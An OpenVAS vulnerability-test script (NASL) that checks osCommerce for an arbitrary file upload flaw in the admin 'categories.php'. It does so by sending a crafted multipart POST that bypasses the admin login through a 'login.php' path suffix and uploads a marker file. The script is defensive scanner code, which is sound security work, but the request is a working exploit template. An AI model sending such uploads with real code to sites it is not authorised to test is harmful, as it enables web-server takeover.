###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_oscommerce_44995.nasl 14 2013-10-27 12:33:37Z jan $
#
# osCommerce 'categories.php' Arbitrary File Upload Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "osCommerce is prone to a vulnerability that lets attackers upload
arbitrary files. The issue occurs because the application fails to
adequately sanitize user-supplied input.

An attacker can exploit this vulnerability to upload arbitrary code
and run it in the context of the webserver process. This may
facilitate unauthorized access or privilege escalation; other attacks
are also possible.";


desc = "
 Summary:
 " + tag_summary;


if (description)
{
 script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/44995");
 script_xref(name : "URL" , value : "http://www.oscommerce.com/solutions/downloads");
 script_id(100913);
 script_version("$Revision: 14 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2010-11-22 15:38:55 +0100 (Mon, 22 Nov 2010)");
 script_bugtraq_id(44995);
 script_tag(name:"cvss_base", value:"4.6");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:S/C:P/I:P/A:P");

 script_name("osCommerce 'categories.php' Arbitrary File Upload Vulnerability");
 script_tag(name:"risk_factor", value:"Medium");
 script_description(desc);
 script_summary("Determine if installed osCommerce is vulnerable");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("oscommerce_detect.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("version_func.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

if(!dir = get_dir_from_kb(port:port,app:"oscommerce"))exit(0);

rand = rand();
file = string("OpenVAS_TEST_DELETE_ME_", rand, ".php"); 

len = 348 + strlen(file);
url =  string(dir,"/admin/categories.php/login.php?cPath=&action=new_product_previe");

req = string(
          "POST ",dir,"/admin/categories.php/login.php?cPath=&action=new_product_preview HTTP/1.1\r\n",
          "Host: 192.168.2.4\r\n",
          "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
          "Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3\r\n",
          "Accept-Encoding: gzip,deflate\r\n",
          "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n",
          "Connection: close\r\n",
          "Cookie: osCAdminID=39dcb776097440be7f8c32ffde752a74; LastVisit=1285316401\r\n",
          "Content-Type: multipart/form-data; boundary=---------------------------6540612847563306631121268491\r\n",
          "Content-Length: ",len,"\r\n",
          "\r\n",
          "-----------------------------6540612847563306631121268491\r\n",
          'Content-Disposition: form-data; name="products_image"; filename="',file,'"',"\r\n",
          "Content-Type: application/x-bzip\r\n",
          "\r\n",
          "OpenVAS-Upload-Test","\r\n",
          "\r\n",
          "-----------------------------6540612847563306631121268491\r\n",
          'Content-Disposition: form-data; name="submit"',"\r\n",
          "\r\n",
          " Save ","\r\n",
          "-----------------------------6540612847563306631121268491--\r\n","\r\n");

recv = http_keepalive_send_recv(data:req, port:port, bodyonly:TRUE);
url = string(dir,"/images/",file);

if(http_vuln_check(port:port, url:url,pattern:"OpenVAS-Upload-Test")) {

      report = string( 
        desc, "\n\n",
        "Note :\n\n",
        "## It was possible to upload and execute a file on the remote webserver.\n",
        "## The file is placed in directory: ", '"', dir, '/images/"', "\n",
        "## and is named: ", '"', file, '"', "\n",
        "## You should delete this file as soon as possible!\n");    

 
      security_hole(port:port,data:report);
      exit(0);

    }


exit(0);
